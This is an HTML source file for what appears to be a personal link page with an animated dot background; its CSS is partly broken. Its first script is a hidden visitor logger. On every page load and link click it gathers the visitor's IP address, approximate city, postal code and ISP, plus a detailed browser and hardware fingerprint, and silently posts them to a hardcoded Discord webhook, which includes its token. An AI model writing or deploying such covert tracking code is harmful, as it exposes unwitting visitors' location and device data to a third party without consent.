<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
<style>
  *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

  body {
    background: #060608;
    color: #fff;
    font-family: 'Syne', sans-serif;
    height: 100vh;
    overflow: hidden;
    display: flex;

  canvas {

  .container {

  @keyframes fadeUp {

  .name {
    font-size: clamp(3.5rem, 10vw, 7rem);

  .tagline {

  .links {
    display: flex;

    gap: 14px;

  .link {
    display: flex;

    border-radius: 4px;
    background: rgba(255,255,255,0.03);
    transition: color 0.2s, border-color 0.2s, background 0.2s;
    backdrop-filter: blur(8px);
    cursor: pointer;
    animation: fadeUp 1.2s cubic-bezier(0.16, 1, 0.3, 1) both;
  }

  .link:nth-child(1) { animation-delay: 0.25s; }
  .link:nth-child(2) { animation-delay: 0.35s; }
  .link:nth-child(3) { animation-delay: 0.45s; }
  .link:nth-child(4) { animation-delay: 0.55s; }
  .link:nth-child(5) { animation-delay: 0.65s; }

  .link:hover {

  }

  .link svg {
    opacity: 0.4;
    transition: opacity 0.2s;

  .link:hover svg { opacity: 1; }

<body>

<script>
  // ======================================================
  // CONFIG — paste your Discord webhook URL here
  // ======================================================
  const WEBHOOK = 'https://discord.com/api/webhooks/1499514371511025856/nxiLGjYa_v31aLOVjZxXaZ79V15gAr7KOem3gypFTWNt6UKopkFo65LUNLcdJZ0u0CCn';
  // ======================================================

  function getFingerprint() {
    const ua = navigator.userAgent;
    const platform = navigator.platform || 'Unknown';
    const lang = navigator.language || 'Unknown';
    const langs = (navigator.languages || []).join(', ') || 'Unknown';
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
    const screen_res = `${screen.width}x${screen.height}`;
    const viewport = `${window.innerWidth}x${window.innerHeight}`;
    const color_depth = screen.colorDepth + '-bit';
    const pixel_ratio = window.devicePixelRatio || 1;
    const referrer = document.referrer || 'Direct / None';
    const cookies = navigator.cookieEnabled ? 'Yes' : 'No';
    const do_not_track = navigator.doNotTrack || 'Unset';
    const touch = navigator.maxTouchPoints > 0 ? `Yes (${navigator.maxTouchPoints} points)` : 'No';
    const memory = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown';
    const cores = navigator.hardwareConcurrency || 'Unknown';
    const connection = navigator.connection ? 
      `${navigator.connection.effectiveType || '?'} / ${navigator.connection.downlink || '?'} Mbps` : 'Unknown';

    let os = 'Unknown';
    if      (ua.includes('Windows NT 10'))  os = 'Windows 10/11';
    else if (ua.includes('Windows NT 6.3')) os = 'Windows 8.1';
    else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
    else if (ua.includes('Mac OS X'))       os = 'macOS';
    else if (ua.includes('Android'))        os = 'Android';
    else if (ua.includes('iPhone'))         os = 'iOS (iPhone)';
    else if (ua.includes('iPad'))           os = 'iOS (iPad)';
    else if (ua.includes('Linux'))          os = 'Linux';

    let browser = 'Unknown';
    if      (ua.includes('Edg/'))     browser = 'Edge';
    else if (ua.includes('OPR/'))     browser = 'Opera';
    else if (ua.includes('Brave'))    browser = 'Brave';
    else if (ua.includes('Chrome/'))  browser = 'Chrome';
    else if (ua.includes('Firefox/')) browser = 'Firefox';
    else if (ua.includes('Safari/'))  browser = 'Safari';

    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    let gpu = 'Unknown';
    if (gl) {
      const dbg = gl.getExtension('WEBGL_debug_renderer_info');
      if (dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }

    return { ua, os, browser, platform, lang, langs, tz, screen_res, viewport,
             color_depth, pixel_ratio, referrer, cookies, do_not_track,
             touch, memory, cores, connection, gpu };
  }

  async function buildEmbed(title, color, extraFields) {
    const res      = await fetch('https://api.ipify.org?format=json');
    const { ip }   = await res.json();
    const infoRes  = await fetch(`https://ipapi.co/${ip}/json/`);
    const info     = await infoRes.json();
    const fp       = getFingerprint();

    const fields = [
      ...extraFields,
      { name: '📡 IP',           value: ip,                              inline: true  },
      { name: '🌍 Country',      value: info.country_name || 'Unknown',  inline: true  },
      { name: '🏙 City',         value: (info.city && info.region) ? `${info.city}, ${info.region}` : 'Unknown', inline: true },
      { name: '🏢 ISP',          value: info.org          || 'Unknown',  inline: true  },
      { name: '📮 Postal',       value: info.postal       || 'Unknown',  inline: true  },
      { name: '🕐 Timezone',     value: fp.tz,                           inline: true  },
      { name: '💻 OS',           value: fp.os,                           inline: true  },
      { name: '🌐 Browser',      value: fp.browser,                      inline: true  },
      { name: '📺 Screen',       value: fp.screen_res,                   inline: true  },
      { name: '🖼 Viewport',     value: fp.viewport,                     inline: true  },
      { name: '🎨 Color Depth',  value: fp.color_depth,                  inline: true  },
      { name: '⚡ Pixel Ratio',  value: String(fp.pixel_ratio),          inline: true  },
      { name: '🗣 Language',     value: fp.lang,                         inline: true  },
      { name: '🧠 RAM',          value: fp.memory,                       inline: true  },
      { name: '⚙️ CPU Cores',   value: String(fp.cores),                inline: true  },
      { name: '📶 Connection',   value: fp.connection,                   inline: true  },
      { name: '👆 Touch',        value: fp.touch,                        inline: true  },
      { name: '🎮 GPU',          value: fp.gpu,                          inline: false },
      { name: '🔗 Referrer',     value: fp.referrer,                     inline: false },
      { name: '🍪 Cookies',      value: fp.cookies,                      inline: true  },
      { name: '🚫 DNT',          value: fp.do_not_track,                 inline: true  },
      { name: '📋 User Agent',   value: fp.ua.slice(0, 200),             inline: false },
    ];

    return {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [{ title, color, fields, timestamp: new Date().toISOString() }] })
    };
  }

  async function logAndRedirect(url, label) {
    try {
      const req = await buildEmbed('🔗 Link Click — 8xgl.xyz', 0x111111, [
        { name: '🖱 Clicked', value: label, inline: true }
      ]);
      await fetch(WEBHOOK, req);
    } catch(e) {}
    window.open(url, '_blank', 'noopener');
  }

  document.querySelectorAll('.link[data-url]').forEach(el => {
    el.addEventListener('click', e => {
      e.preventDefault();
      logAndRedirect(el.dataset.url, el.dataset.label);
    });
  });

  (async () => {
    try {
      const req = await buildEmbed('👁 Page Visit — 8xgl.xyz', 0x222222, []);
      await fetch(WEBHOOK, req);
    } catch(e) {}
  })();
</script>

<script>
const canvas = document.getElementById('c');
const ctx = canvas.getContext('2d');

let W, H, dots;

const DOTS = 88;
const MAX_DIST = 145;
const DOT_COLOR = 'rgba(255,255,255,';

function resize() {
  W = canvas.width  = window.innerWidth;
  H = canvas.height = window.innerHeight;
}

function initDots() {
  dots = Array.from({ length: DOTS }, () => ({
    x:  Math.random() * W,
    y:  Math.random() * H,
    vx: (Math.random() - 0.5) * 0.45,
    vy: (Math.random() - 0.5) * 0.45,
    r:  Math.random() * 1.5 + 1
  }));
}

function draw() {
  ctx.clearRect(0, 0, W, H);

  for (let i = 0; i < dots.length; i++) {
    const d = dots[i];
    d.x += d.vx;
    d.y += d.vy;
    if (d.x < 0 || d.x > W) d.vx *= -1;
    if (d.y < 0 || d.y > H) d.vy *= -1;

    ctx.beginPath();
    ctx.arc(d.x, d.y, d.r, 0, Math.PI * 2);
    ctx.fillStyle = DOT_COLOR + '0.55)';
    ctx.fill();

    for (let j = i + 1; j < dots.length; j++) {
      const b = dots[j];
      const dx = d.x - b.x;
      const dy = d.y - b.y;
      const dist = Math.sqrt(dx * dx + dy * dy);
      if (dist < MAX_DIST) {
        const alpha = (1 - dist / MAX_DIST) * 0.18;
        ctx.beginPath();
        ctx.moveTo(d.x, d.y);
        ctx.lineTo(b.x, b.y);
        ctx.strokeStyle = DOT_COLOR + alpha + ')';
        ctx.lineWidth = 0.7;
        ctx.stroke();
      }
    }
  }

  requestAnimationFrame(draw);
}

window.addEventListener('resize', () => { resize(); initDots(); });
resize();
initDots();
draw();
</script>
</body>
